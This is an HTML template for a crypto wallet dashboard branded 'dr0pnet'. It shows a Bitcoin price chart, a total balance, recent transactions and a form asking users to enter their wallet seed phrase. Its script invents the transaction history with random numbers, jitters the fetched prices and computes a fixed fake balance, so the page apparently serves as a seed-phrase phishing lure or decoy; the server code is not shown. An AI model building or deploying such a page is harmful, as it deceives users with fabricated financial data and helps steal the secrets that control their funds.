<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>dr0pnet Wallet Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

  <style>
    body {
      background-color: #0f0f0f;
      color: #00ffcc;
      font-family: Helvetica, sans-serif;
    }
    .card {
      background-color: #111;
      border: 1px solid #00ffcc;
      box-shadow: 0 0 20px #00ffcc;
    }
    .card h3, .card h1, .card p, .card label {
      color: #00ffcc;
    }
    .sidebar {
      background-color: #111;
      padding: 20px;
      height: 100vh;
      border-right: 2px solid #00ffcc;
    }
    .sidebar h2 {
      color: #00ffcc;
      margin-bottom: 20px;
    }
    .sidebar ul {
      list-style: none;
      padding: 0;
    }
    .sidebar li {
      padding: 10px 0;
      color: #66B2FF;
      cursor: pointer;
    }
    .sidebar .active {
      font-weight: bold;
      color: #fff;
    }
    .coin-icon-xl {
      width: 32px;
      vertical-align: middle;
      margin-right: 10px;
    }
    .export-btn, button {
      background-color: #00ffcc;
      border: none;
      padding: 10px 20px;
      color: black;
      font-weight: bold;
      border-radius: 6px;
      text-decoration: none;
      transition: background-color 0.3s;
    }
    .export-btn:hover, button:hover {
      background-color: #00e6b3;
    }
    canvas {
      background-color: #000;
      border-radius: 8px;
    }
  #liveTransactions li {
    color: #66B2FF;
    font-weight: 500;
  }

  #btc-price-box,
  #eth-price-box,
  #xrp-price-box {
    color: #66B2FF;
    font-weight: bold;
    font-size: 18px;
  }
</style>

  </style>
</head>
<body>

<div class="container-fluid">
  <div class="row">
    <!-- Sidebar -->
    <div class="col-md-2 sidebar">
      <h2>Crypto Wallet</h2>
      <ul>
        <li>Profile</li>
        <li class="active">Dashboard</li>
        <li>Wallet</li>
        <li>Trade</li>
        <li>Notifications</li>
        <li>Exchange</li>
      </ul>
    </div>

    <!-- Main Content -->
    <div class="col-md-10 py-4">
      <div class="row g-4">
        <!-- BTC Chart -->
        <div class="col-lg-12">
          <div class="card p-4 mb-4">
            <h3>Bitcoin (BTC-USD)</h3>
            <h1 id="btc-price">$0.00</h1>
            <div class="d-flex gap-2 mb-3">
              <button>24h</button>
              <button>1 Week</button>
              <button>1 Month</button>
            </div>
            <canvas id="priceChart" style="height: 350px;"></canvas>
          </div>
        </div>

        <!-- Admin + Transactions -->
        <div class="col-lg-6">
          <div class="card p-4 h-100 text-center">
            <h3>Admin</h3>
            <p>Total Balance</p>
            <h1 id="total-balance">$0.00</h1>
            <hr>
            <div>
              <div><img src="/static/images/btc.png" class="coin-icon-xl"> <span id="btc-price-box">$0.00</span></div>
              <div><img src="/static/images/eth.png" class="coin-icon-xl"> <span id="eth-price-box">$0.00</span></div>
              <div><img src="/static/images/xrp.png" class="coin-icon-xl"> <span id="xrp-price-box">$0.00</span></div>
            </div>
          </div>
        </div>

        <div class="col-lg-6">
          <div class="card p-4 h-100">
            <h3>üìä Recent Transactions</h3>
            <ul id="liveTransactions" class="mb-0">
              <li>Loading...</li>
            </ul>
          </div>
        </div>

        <!-- Import + Export Side-by-Side -->
        <div class="col-lg-6">
          <div class="card p-4 h-100">
            <h3>üîê Enter Seed Phrase</h3>
            <form action="/import" method="post">
              <input type="text" name="seed" placeholder="Enter your seed phrase..." required class="form-control mb-2">
              <button type="submit">Import Wallet</button>
            </form>
          </div>
        </div>

        <div class="col-lg-6">
          <div class="card p-4 h-100">
            <h3>üìÅ Export Keys</h3>
            <a href="/export" class="export-btn">Seed Phrase File</a>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- JavaScript for Prices and Chart -->
<script>
let chart;
let priceHistory = [];
let btcPrice = 0, ethPrice = 0, xrpPrice = 0;

const preloadTx = () => {
  const coins = ['BTC', 'ETH', 'XRP'];
  const actions = ['Deposited', 'Withdrawn'];
  const ul = document.getElementById("liveTransactions");
  ul.innerHTML = '';
  for (let i = 0; i < 5; i++) {
    const coin = coins[Math.floor(Math.random() * coins.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];
    const amount = (Math.random() * (coin === 'BTC' ? 0.5 : coin === 'ETH' ? 10 : 500)).toFixed(4);
    const price = (Math.random() * 1000 + 30000).toFixed(2);
    const txid = Math.random().toString(36).substring(2, 10).toUpperCase();
    const li = `<li>${coin} ${action}: ${amount} @ $${price} | TXID: ${txid}</li>`;
    ul.insertAdjacentHTML('beforeend', li);
  }
};

function updateChart(price) {
  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  if (priceHistory.length > 20) {
    priceHistory.shift();
    chart.data.labels.shift();
    chart.data.datasets[0].data.shift();
  }
  priceHistory.push(price);
  chart.data.labels.push(time);
  chart.data.datasets[0].data.push(price);
  chart.update();
}

async function fetchPrices() {
  try {
    const res = await fetch("/api/prices");
    const data = await res.json();
    btcPrice = +(data.bitcoin.usd + (Math.random() - 0.5) * 80).toFixed(2);
    ethPrice = +(data.ethereum.usd + (Math.random() - 0.5) * 10).toFixed(2);
    xrpPrice = +(data.ripple.usd + (Math.random() - 0.5) * 0.1).toFixed(4);

    document.getElementById("btc-price-box").textContent = `$${btcPrice.toLocaleString()}`;
    document.getElementById("eth-price-box").textContent = `$${ethPrice.toLocaleString()}`;
    document.getElementById("xrp-price-box").textContent = `$${xrpPrice.toLocaleString()}`;

    document.getElementById("btc-price").textContent = `$${btcPrice.toLocaleString()}`;
    const totalBalance = (btcPrice * 2 + ethPrice * 20 + xrpPrice * 3000).toFixed(2);
    document.getElementById("total-balance").textContent = `$${Number(totalBalance).toLocaleString()}`;

    updateChart(btcPrice);
  } catch (err) {
    console.error("Price fetch failed", err);
  }
}

window.onload = function () {
  preloadTx();

  const ctx = document.getElementById('priceChart').getContext('2d');
  chart = new Chart(ctx, {
    type: 'line',
    data: {
      labels: [],
      datasets: [{
        label: 'BTC Price',
        data: [],
        borderColor: '#00ff99',
        backgroundColor: 'rgba(0,255,153,0.05)',
        tension: 0.4
      }]
    },
    options: {
      responsive: true,
      scales: {
        x: { ticks: { color: '#00ff99' }},
        y: { ticks: { color: '#00ff99' }}
      },
      plugins: {
        legend: { labels: { color: '#00ff99' }}
      }
    }
  });

  fetchPrices();
  setInterval(fetchPrices, 60000);
};
</script>

</body>
</html>
